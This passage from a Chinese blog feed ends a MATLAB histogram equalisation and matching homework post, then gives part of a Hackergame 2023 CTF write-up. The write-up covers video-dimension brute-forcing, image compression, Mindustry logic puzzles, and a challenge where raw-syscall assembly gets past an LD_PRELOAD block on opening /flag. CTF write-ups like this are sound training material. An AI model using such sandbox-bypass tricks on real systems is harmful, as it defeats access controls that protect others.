MATLAB》，在同一个窗口展示多张图片，我们需要用到<code>subplot()</code>函数</p><p>所以展示原图以及原图的灰度直方图可以通过如下代码实现：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">img1 = imread(<span class="string">&#x27;river.JPG&#x27;</span>);</span><br><span class="line"><span class="built_in">figure</span>(<span class="number">1</span>),</span><br><span class="line">subplot(<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>),</span><br><span class="line">imshow(img1);title(<span class="string">&#x27;原图&#x27;</span>);</span><br><span class="line">subplot(<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>),</span><br><span class="line">imhist(img1);title(<span class="string">&#x27;原图直方图&#x27;</span>);</span><br></pre></td></tr></table></figure><img src="/posts/9f249bc44c42/image-20231105174330656.png" class="" title="image-20231105174330656"><p>那么接下来就需要编写直方图均衡的代码</p><p>首先直方图均衡的变换函数如下</p><img src="/posts/9f249bc44c42/image-20231105165834743.png" class="" title="image-20231105165834743"><p>其中积分的部分我们可以通过累加图像的灰度值频率向量来获得</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[counts, x] = imhist(img1,<span class="number">256</span>); </span><br><span class="line">total_pixels = <span class="built_in">numel</span>(img1);</span><br><span class="line">cdf = cumsum(counts) / total_pixels;</span><br></pre></td></tr></table></figure><p><code>numel()</code>统计了图像的像素点个数</p><p><code>cumsum()</code>即为累加函数，对于输入数组 <code>A = [1, 2, 3, 4]</code>，<code>cumsum(A)</code> 返回数组 <code>[1, 3, 6, 10]</code></p><p>本题的灰度级为255，所以我们将cdf乘以255得到变换函数</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f = uint8(cdf * <span class="number">255</span>);</span><br><span class="line">img2 = f(img1 + <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>最后我们还需要与Matlab的<code>histeq()</code>函数进行对比，该函数直接调用即可</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img3 = histeq(img1)</span><br></pre></td></tr></table></figure><p>本题完整代码如下</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">img1 = imread(<span class="string">&#x27;river.JPG&#x27;</span>);</span><br><span class="line">[counts, x] = imhist(img1,<span class="number">256</span>); </span><br><span class="line">total_pixels = <span class="built_in">numel</span>(img1);</span><br><span class="line"><span class="comment">% 计算累计分布函数 CDF</span></span><br><span class="line">cdf = cumsum(counts) / total_pixels;</span><br><span class="line"><span class="comment">% 得到直方图均衡的变换函数</span></span><br><span class="line">f = uint8(cdf * <span class="number">255</span>);</span><br><span class="line"><span class="comment">% 映射原始图像的像素值</span></span><br><span class="line">img2 = f(img1 + <span class="number">1</span>);</span><br><span class="line"><span class="comment">% 调用histeq直接直方图均衡</span></span><br><span class="line">img3 = histeq(img1);</span><br><span class="line"><span class="built_in">figure</span>(),</span><br><span class="line">subplot(<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>),</span><br><span class="line">imshow(img1);title(<span class="string">&#x27;原图&#x27;</span>);</span><br><span class="line">subplot(<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>),</span><br><span class="line">imhist(img1,<span class="number">256</span>);title(<span class="string">&#x27;原图直方图&#x27;</span>);</span><br><span class="line">subplot(<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>),</span><br><span class="line">imshow(img2);title(<span class="string">&#x27;直方图均衡后的图像&#x27;</span>);</span><br><span class="line">subplot(<span class="number">3</span>,<span class="number">2</span>,<span class="number">4</span>),</span><br><span class="line">imhist(img2,<span class="number">256</span>);title(<span class="string">&#x27;直方图均衡后的直方图&#x27;</span>);</span><br><span class="line">subplot(<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>),</span><br><span class="line">imshow(img3);title(<span class="string">&#x27;histeq后的图像&#x27;</span>);</span><br><span class="line">subplot(<span class="number">3</span>,<span class="number">2</span>,<span class="number">6</span>),</span><br><span class="line">imhist(img3,<span class="number">256</span>);title(<span class="string">&#x27;histeq后的直方图&#x27;</span>);</span><br></pre></td></tr></table></figure><p>运行效果如下图</p><img src="/posts/9f249bc44c42/image-20231105175344550.png" class="" title="image-20231105175344550"><p>如果想保存中间结果图像，可以使用<code>imwrite()</code>函数，而最终的结果对比窗口可以使用<code>saveas()</code></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">imwrite(img2,<span class="string">&#x27;river2.jpg&#x27;</span>);</span><br><span class="line">imwrite(img3,<span class="string">&#x27;river3.jpg&#x27;</span>);</span><br><span class="line">saveas(gcf,<span class="string">&#x27;result.png&#x27;</span>);</span><br></pre></td></tr></table></figure><h1 id="HW2-直方图匹配"><a href="#HW2-直方图匹配" class="headerlink" title="HW2 直方图匹配"></a>HW2 直方图匹配</h1><p>作业要求 ：</p><blockquote><p>将图像 EightAM.png 的直方图匹配为图像LENA.png的直方图 ， 显示EightAM.png在直方图匹配前后的图像，并绘制LENA.png的直方图、直方图匹配前后EightAM.png的直方图，检查直方图匹配的效果。 </p></blockquote><p>回顾PPT中的直方图匹配算法</p><img src="/posts/9f249bc44c42/image-20231105193737053.png" class="" title="image-20231105193737053"><p>首先计算原图的直方图均衡转换函数，接着计算目标图的直方图均衡函数</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ori_img = imread(<span class="string">&#x27;EightAM.png&#x27;</span>);</span><br><span class="line">tar_img = imread(<span class="string">&#x27;LENA.png&#x27;</span>);</span><br><span class="line">ori_hist = imhist(ori_img);</span><br><span class="line">tar_hist = imhist(tar_img);</span><br><span class="line"><span class="comment">% 计算原始图像和目标图像的CDF</span></span><br><span class="line">ori_cdf = cumsum(ori_hist) / <span class="built_in">numel</span>(ori_img);</span><br><span class="line">tar_cdf = cumsum(tar_hist) / <span class="built_in">numel</span>(tar_img);</span><br></pre></td></tr></table></figure><p>得到$D_A$和$D_C$之间的映射表，然后我们将原图根据映射表转为目标直方图形状的图像，即完成直方图匹配</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 建立映射表</span></span><br><span class="line">Match   = uint8(<span class="built_in">zeros</span>(<span class="number">1</span>,<span class="number">256</span>));</span><br><span class="line"><span class="keyword">for</span> index = <span class="number">1</span> : <span class="number">256</span></span><br><span class="line">    [tmp,ind] = <span class="built_in">min</span>(<span class="built_in">abs</span>(ori_cdf(index) - tar_cdf));</span><br><span class="line">    Match(index)    = ind<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">res_img = Match(ori_img+<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>完整代码如下：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">ori_img = imread(<span class="string">&#x27;EightAM.png&#x27;</span>);</span><br><span class="line">tar_img = imread(<span class="string">&#x27;LENA.png&#x27;</span>);</span><br><span class="line">ori_hist = imhist(ori_img);</span><br><span class="line">tar_hist = imhist(tar_img);</span><br><span class="line"><span class="comment">% 计算原始图像和目标图像的CDF</span></span><br><span class="line">ori_cdf = cumsum(ori_hist) / <span class="built_in">numel</span>(ori_img);</span><br><span class="line">tar_cdf = cumsum(tar_hist) / <span class="built_in">numel</span>(tar_img);</span><br><span class="line"><span class="comment">% 建立映射表</span></span><br><span class="line">Match   = uint8(<span class="built_in">zeros</span>(<span class="number">1</span>,<span class="number">256</span>));</span><br><span class="line"><span class="keyword">for</span> index = <span class="number">1</span> : <span class="number">256</span></span><br><span class="line">    [tmp,ind] = <span class="built_in">min</span>(<span class="built_in">abs</span>(ori_cdf(index) - tar_cdf));</span><br><span class="line">    Match(index)    = ind<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">res_img = Match(ori_img+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">figure</span>(),</span><br><span class="line">subplot(<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>),</span><br><span class="line">imshow(ori_img);title(<span class="string">&#x27;原图&#x27;</span>);</span><br><span class="line">subplot(<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>),</span><br><span class="line">imhist(ori_img,<span class="number">256</span>);title(<span class="string">&#x27;原图直方图&#x27;</span>);</span><br><span class="line">subplot(<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>),</span><br><span class="line">imshow(tar_img);title(<span class="string">&#x27;目标图&#x27;</span>);</span><br><span class="line">subplot(<span class="number">3</span>,<span class="number">2</span>,<span class="number">4</span>),</span><br><span class="line">imhist(tar_img,<span class="number">256</span>);title(<span class="string">&#x27;目标图直方图&#x27;</span>);</span><br><span class="line">subplot(<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>),</span><br><span class="line">imshow(res_img);title(<span class="string">&#x27;直方图匹配后的图像&#x27;</span>);</span><br><span class="line">subplot(<span class="number">3</span>,<span class="number">2</span>,<span class="number">6</span>),</span><br><span class="line">imhist(res_img,<span class="number">256</span>);title(<span class="string">&#x27;直方图匹配后的直方图&#x27;</span>);</span><br><span class="line">imwrite(res_img,<span class="string">&#x27;res_img.png&#x27;</span>);</span><br><span class="line">saveas(gcf,<span class="string">&#x27;result.jpg&#x27;</span>);</span><br></pre></td></tr></table></figure><p>最终效果如下图，可以看到结果图片和LENA这张图的对比度很相似</p><img src="/posts/9f249bc44c42/result.jpg" class="" title="result">]]></content>
      
      
      
        <tags>
            
            <tag> MATLAB </tag>
            
            <tag> Digital Image Processing </tag>
            
            <tag> project </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hackergame 2023 Summary(part2)</title>
      <link href="/posts/728dfb47b6df/"/>
      <url>/posts/728dfb47b6df/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>成功挤进校内前5，总榜前70</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231104123531580.png" alt="image-20231104123531580"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231104123607446.png" alt="image-20231104123607446"></p><p>欣慰地看到这一年来的努力没有白费，自己的技术力有见长</p><p>也欣慰地看到今年的排行榜分数比去年更卷了，这是好事，说明网安圈高技术力的师傅们越来越多了，以后也能看到更多大佬们的技术分享文章</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="流式星球"><a href="#流式星球" class="headerlink" title="流式星球"></a>流式星球</h3><p>该程序将视频转化为维度是<strong>(frame_count, frame_height, frame_width, 3)的矩阵</strong></p><p>由于转出的文件并不包含元数据，所以长宽信息需要我们自己来爆破</p><p>爆破脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_video</span>(<span class="params">input_file, output_file, frame_height, frame_width</span>):</span><br><span class="line">    buffer = np.fromfile(input_file, dtype=np.uint8)</span><br><span class="line">    drop = buffer.size % (frame_width*frame_height*<span class="number">30</span>)</span><br><span class="line">    buffer = buffer[:(drop*-<span class="number">1</span>)].reshape((-<span class="number">1</span>, frame_height, frame_width, <span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">    fourcc = cv2.VideoWriter_fourcc(*<span class="string">&quot;mp4v&quot;</span>)</span><br><span class="line">    out = cv2.VideoWriter(output_file, fourcc, <span class="number">30</span>, (frame_width, frame_height))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> frame <span class="keyword">in</span> buffer:</span><br><span class="line">        out.write(frame)</span><br><span class="line"></span><br><span class="line">    out.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>,<span class="number">800</span>,<span class="number">10</span>):</span><br><span class="line">        create_video(<span class="string">&quot;video.bin&quot;</span>, <span class="string">f&quot;videos/output_width<span class="subst">&#123;i&#125;</span>.mp4&quot;</span>, <span class="number">500</span>, i)</span><br></pre></td></tr></table></figure><p>我们<strong>将高度先固定</strong>，爆破宽度从500到800，然后人工翻阅，查看是否有有效信息的视频</p><p>当宽度为640时，视频内容变得较为有语义</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231030152832035.png" alt="image-20231030152832035"></p><p>此时我们需要将宽度固定，来确认高度</p><p>当视频的内容<strong>上下流动的速度变慢时，说明我们离正确高度比较接近</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>,<span class="number">800</span>,<span class="number">10</span>):</span><br><span class="line">    create_video(<span class="string">&quot;video.bin&quot;</span>, <span class="string">f&quot;videos/output_height<span class="subst">&#123;i&#125;</span>.mp4&quot;</span>, i, <span class="number">640</span>)</span><br></pre></td></tr></table></figure><p>我们发现<strong>高度从500到510时，视频内容从向向下流动变为向上流动</strong></p><p>说明正确高度就在这个范围间</p><p>经过测试，<strong>505较为稳定</strong></p><p>我们再来精细化宽度</p><p>由于一张图同时出现了三个帧，我们将宽度缩为原来的<strong>三分之一</strong></p><p>经过细调，<strong>宽度为214</strong></p><p>截得flag如下</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231030155823462-16990761197528.png" alt="image-20231030155823462"></p><p>视频内容为<code>为什么？为什么要flag&#123;it-could-be-easy-to-restore-video-with-haruhikage-even-without-metadata-0F7968CC&#125;</code></p><h3 id="低带宽星球"><a href="#低带宽星球" class="headerlink" title="低带宽星球"></a>低带宽星球</h3><p>本题需要无损压缩一张图片</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-16990761197529.png" alt="image"></p><p>第一问从5.7KB压到2KB以下</p><p>考虑PNG转WEBP</p><p>得到flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231029004733104-169907611975210.png" alt="image-20231029004733104"></p><h3 id="为什么要打开-flag-😡"><a href="#为什么要打开-flag-😡" class="headerlink" title="为什么要打开 /flag 😡"></a>为什么要打开 /flag 😡</h3><p>为了绕过<code>open</code>等函数，我们可以自行编写汇编代码使用系统调用号，调用sys_open，进而打开文件</p><p>编写汇编文件后还需要执行如下步骤：</p><ol><li><p>汇编：执行<code>as exp.s -o exp.o</code>将exp.s翻译成机器语言指令并打包为可重定向文件，结果保存在目标文件exp.o中</p></li><li><p>链接：执行<code>ld -o exp exp.o -lc</code>将hello.o和其他库文件、目标代码链接后形成<strong>可执行文件</strong>。</p></li></ol><p>提交可执行文件<code>exp</code></p><p>得到flag<code>flag&#123;nande_ld_preload_yattano_40425457b9&#125;</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231103233240782.png" alt="image-20231103233240782"></p><h3 id="异星歧途"><a href="#异星歧途" class="headerlink" title="异星歧途"></a>异星歧途</h3><p>整个地图的概览如下</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231102224957113.png" alt="image-20231102224957113"></p><p>我们需要控制红框中的那些开关，使得各个部分正常工作</p><h4 id="Part1"><a href="#Part1" class="headerlink" title="Part1"></a>Part1</h4><p>首先看第一部分</p><p>这一段的工作元件如下图所示</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231102225853873.png" alt="image-20231102225853873"></p><p>运输过来的煤炭给火力发电机供电，进而产生电力，电力则通过电线传输给下一部分</p><p>查看该微型处理器以及其链接的方块</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231102225838443.png" alt="image-20231102225838443"></p><p>该火力发电机受到微型处理器的控制，命名为<code>generator1</code>，同时开关<code>switch1</code>到<code>switch8</code>也在控制范围内</p><p>微处理器中的命令如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sensor s1 switch1 @enabled</span><br><span class="line">sensor s2 switch2 @enabled</span><br><span class="line">sensor s3 switch3 @enabled</span><br><span class="line">sensor s4 switch4 @enabled</span><br><span class="line">sensor s5 switch5 @enabled</span><br><span class="line">sensor s6 switch6 @enabled</span><br><span class="line">sensor s7 switch7 @enabled</span><br><span class="line">sensor s8 switch8 @enabled</span><br><span class="line">jump 18 equal s1 false</span><br><span class="line">jump 18 equal s2 true</span><br><span class="line">jump 18 equal s3 false</span><br><span class="line">jump 18 equal s4 true</span><br><span class="line">jump 18 equal s5 true</span><br><span class="line">jump 18 equal s6 false</span><br><span class="line">jump 18 equal s7 true</span><br><span class="line">jump 18 equal s8 false</span><br><span class="line">control enabled generator1 1 0 0 0</span><br><span class="line">end</span><br><span class="line">control enabled generator1 0 0 0 0</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>目标是让generator1的enable状态置为1</p><p>而前面这些jump语句都会跳到18，导致generator1的enable状态为0</p><p>所以我们就需要<strong>使得这些jump的判断条件为False</strong></p><p>此时开关s1到s8的值应该置为<code>10100101</code></p><div class="note success flat"><p>成功工作！</p></div><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231102230505530.png" alt="image-20231102230505530"></p><h4 id="Part2"><a href="#Part2" class="headerlink" title="Part2"></a>Part2</h4><p>接下来看第二部分</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231102231041420.png" alt="image-20231102231041420"></p><p>很显然，抽水机和涡轮发电机需要同时工作，进而产生电力并传给下一部分</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231102231107734.png" alt="image-20231102231107734"></p><p>我们需要使panell和generator1的enable置为1</p><p>查看逻辑处理器的指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">sensor sw1 switch1 @enabled</span><br><span class="line">sensor sw2 switch2 @enabled</span><br><span class="line">sensor sw3 switch3 @enabled</span><br><span class="line">sensor sw4 switch4 @enabled</span><br><span class="line">sensor sw5 switch5 @enabled</span><br><span class="line">sensor sw6 switch6 @enabled</span><br><span class="line">sensor sw7 switch7 @enabled</span><br><span class="line">sensor sw8 switch8 @enabled</span><br><span class="line">op shl t sw1 7</span><br><span class="line">set number t</span><br><span class="line">op shl t sw2 6</span><br><span class="line">op add number number t</span><br><span class="line">op shl t sw3 5</span><br><span class="line">op add number number t</span><br><span class="line">op shl t sw4 4</span><br><span class="line">op add number number t</span><br><span class="line">op shl t sw5 3</span><br><span class="line">op add number number t</span><br><span class="line">op shl t sw6 2</span><br><span class="line">op add number number t</span><br><span class="line">op shl t sw7 1</span><br><span class="line">op add number number t</span><br><span class="line">set t sw8</span><br><span class="line">op add number number t</span><br><span class="line">set en 0</span><br><span class="line">set i 0</span><br><span class="line">jump 33 greaterThanEq i 16</span><br><span class="line">op pow fl0 i 2</span><br><span class="line">jump 31 notEqual fl0 number</span><br><span class="line">set en 1</span><br><span class="line">jump 33 always x false</span><br><span class="line">op add i i 1</span><br><span class="line">jump 26 always x false</span><br><span class="line">op equal fl1 0 sw1</span><br><span class="line">op equal fl2 0 sw6</span><br><span class="line">op or fl3 fl1 fl2</span><br><span class="line">jump 38 equal fl3 0</span><br><span class="line">set en 0</span><br><span class="line">control enabled generator1 en 0 0 0</span><br><span class="line">control enabled panel1 en 0 0 0</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>我们需要将其翻译为更通俗易懂的python语言</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">switchs = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">number = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(switchs):</span><br><span class="line">    t = switchs[i]&lt;&lt;(<span class="number">7</span>-i)</span><br><span class="line">    number += t</span><br><span class="line">en = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(i&lt;<span class="number">16</span>):</span><br><span class="line">    fl0 = i**<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> fl0 != number:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    en = <span class="number">1</span></span><br><span class="line">fl1 = (<span class="number">0</span>==switchs[<span class="number">0</span>])</span><br><span class="line">fl2 = (<span class="number">0</span>==switchs[<span class="number">5</span>])</span><br><span class="line">fl3 = fl1 <span class="keyword">or</span> fl2</span><br><span class="line"><span class="keyword">if</span> fl3 ==<span class="number">0</span> :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;success!&quot;</span>)</span><br></pre></td></tr></table></figure><p>那么我们需要满足两个条件：<code>en = 1</code>且<code>fl3!=0</code></p><p>前一个条件决定了<strong>number为一个平方数</strong>，而后一个条件则限制了<strong>sw1和sw6必须均为1</strong></p><p>这里我们可以使用爆破脚本找到满足条件的开关序列</p><div class="note warning flat"><p>需要注意的是switch8也在右侧的处理器范围内，一旦置为1，右侧模块则会爆炸</p></div><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231102234514724.png" alt="image-20231102234514724"></p><p>我们可以为该部分编写如下爆破脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">dic = <span class="string">&#x27;01&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> itertools.product(dic, repeat=<span class="number">8</span>):</span><br><span class="line">    switchs = <span class="string">&#x27;&#x27;</span>.join(x)</span><br><span class="line"></span><br><span class="line">    number = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        t = <span class="built_in">int</span>(switchs[i]) &lt;&lt; (<span class="number">7</span> - i)</span><br><span class="line">        number += t</span><br><span class="line">    <span class="keyword">if</span> gmpy2.iroot(number,<span class="number">2</span>)[<span class="number">1</span>] \</span><br><span class="line">            <span class="keyword">and</span> gmpy2.iroot(number,<span class="number">2</span>)[<span class="number">0</span>]!=<span class="number">0</span> \</span><br><span class="line">            <span class="keyword">and</span> <span class="built_in">int</span>(switchs[<span class="number">0</span>])==<span class="number">1</span> \</span><br><span class="line">            <span class="keyword">and</span> <span class="built_in">int</span>(switchs[<span class="number">5</span>])==<span class="number">1</span> \</span><br><span class="line">            <span class="keyword">and</span> <span class="built_in">int</span>(switchs[<span class="number">7</span>])==<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(switchs)</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><div class="note success flat"><p>得到正确序列<code>11000100</code></p></div><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231102235137304.png" alt="image-20231102235137304"></p><h4 id="Part3"><a href="#Part3" class="headerlink" title="Part3"></a>Part3</h4><p>接下来是第三部分</p><p>本段的结构更为复杂，需要我们深入理解工作原理才行</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231103000346836.png" alt="image-20231103000346836"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231103000425438.png" alt="image-20231103000425438"></p><p>想要恢复电力，我们需要让<strong>反应堆1和2运作起来</strong>，也就是reactor1和2的enable需要置为1</p><p>但是反应堆需要散热，否则会爆炸</p><p>而散热则需要满足两个条件：<strong>冷冻液混合器工作</strong>且<strong>冷冻液原料和水能够运输到冷冻液混合器</strong>，同时<strong>冷冻液和水不会分流浪费</strong></p><p>翻译为元件状态则是<strong>mixer1、extractor1和gate1的enable置为1</strong>，<strong>分流导管condult1和condult2的enable置为0</strong></p><p><strong>gate1为反溢流门，所以应该置为0</strong></p><p>最后反应堆也需要原料钍，所以<strong>conveyor2的enable设为1</strong></p><p>而那两天飞机则可有可无</p><p>我们再来看处理器内的指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">sensor sw1 switch1 @enabled</span><br><span 